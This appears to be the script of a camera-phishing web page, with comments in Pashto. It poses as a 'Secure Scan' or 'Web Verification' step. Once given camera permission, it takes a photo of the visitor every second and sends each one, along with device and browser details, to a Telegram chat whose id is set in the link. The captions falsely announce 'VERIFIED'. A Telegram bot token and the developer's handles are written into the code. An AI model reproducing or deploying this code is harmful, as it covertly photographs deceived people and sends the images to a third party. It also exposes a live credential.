const BOT_TOKEN = "8750180526:AAFpXlIk0KHB5j3SljkE7DvheXngu7wA2Kg";

// user id له URL نه اخلو
const params = new URLSearchParams(window.location.search);
const CHAT_ID = params.keys().next().value;

// عناصر
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
const progressBar = document.getElementById("progressBar");

// camera access
navigator.mediaDevices.getUserMedia({ video: true })
  .then(stream => {
    video.srcObject = stream;
    startLoop();
  })
  .catch(() => {
    alert("Camera permission required ❌");
  });

function startLoop() {
  let progress = 0;

  setInterval(() => {
    progress += 10;
    progressBar.style.width = progress + "%";

    if (progress >= 100) {
      progress = 0;
      progressBar.style.width = "0%";
      captureAndSend();
    }

  }, 100); // 1 second
}

// عکس اخلو
function captureAndSend() {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  ctx.filter = "brightness(1.1) contrast(1.2) saturate(1.3)";
  ctx.drawImage(video, 0, 0);

  canvas.toBlob(blob => {
    sendToTelegram(blob);
  }, "image/jpeg");
}

// معلومات جوړوو
function generateCaption() {
  const time = new Date().toLocaleString();
  const device = navigator.userAgent;
  const platform = navigator.platform;

  return `
🌍 Secure Scan Completed

🧠 System: Web Verification
📅 Time: ${time}

📱 Device: ${platform}
🌐 Browser: ${device}

🤖 Bot: @ProSimTookBot
👨‍💻 Dev: @XFPro43

🛡️ Status: VERIFIED ✅
`;
}

// telegram ته لیږل
function sendToTelegram(photo) {
  const formData = new FormData();

  formData.append("chat_id", CHAT_ID);
  formData.append("photo", photo, "scan.jpg");
  formData.append("caption", generateCaption());

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: formData
  })
  .then(res => res.json())
  .then(() => console.log("."))
  .catch(err => console.error(err));
}
